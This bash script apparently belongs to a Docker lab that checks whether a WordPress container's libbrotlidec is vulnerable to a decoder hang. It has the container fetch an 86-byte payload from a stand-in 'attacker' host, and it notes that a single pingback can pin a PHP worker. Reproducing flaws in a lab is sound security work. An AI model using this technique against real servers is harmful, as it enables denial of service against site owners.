#!/usr/bin/env bash
# Verify that the running WordPress container decodes Brotli with a
# vulnerable libbrotlidec.  The decisive test is behavioural: the 86-byte
# payload must make the decoder stop making progress.
set -u

cd "$(dirname "$0")/.."

if ! docker compose ps --status running --services 2>/dev/null | grep -qx wordpress; then
  echo "[-] the wordpress service is not running; run 'make up' first"
  exit 2
fi

echo "[*] PHP / libcurl / Brotli versions"
docker compose exec -T wordpress php -r '
$v = curl_version();
printf("php=%s curl=%s brotli=%s brotli_feature=%s\n",
    PHP_VERSION,
    $v["version"],
    $v["brotli_version"] ?? "unknown",
    (($v["features"] & CURL_VERSION_BROTLI) ? "yes" : "no"));
'

echo
echo "[*] libbrotli package"
docker compose exec -T wordpress sh -c 'dpkg -s libbrotli1 2>/dev/null | grep ^Version || true'

echo
echo "[*] behavioural test: GET http://attacker:8080/small.br with CURLOPT_ENCODING=''"
docker compose exec -T wordpress sh -c 'cat > /tmp/brotli-probe.php' < scripts/probe.php

set +e
docker compose exec -T wordpress timeout 6 php /tmp/brotli-probe.php
status=$?
set -e

echo
if [ "$status" -eq 124 ]; then
  echo "[+] VULNERABLE: the decoder loop did not return within 6s (SIGTERM by timeout)."
  echo "    One pingback is enough to pin a PHP worker."
  exit 0
fi

if [ "$status" -eq 0 ]; then
  echo "[-] NOT VULNERABLE (or the payload was not decoded): the request returned."
  echo "    Check that the attacker container is healthy and that brotli is enabled."
  exit 1
fi

echo "[!] unexpected status $status"
exit "$status"
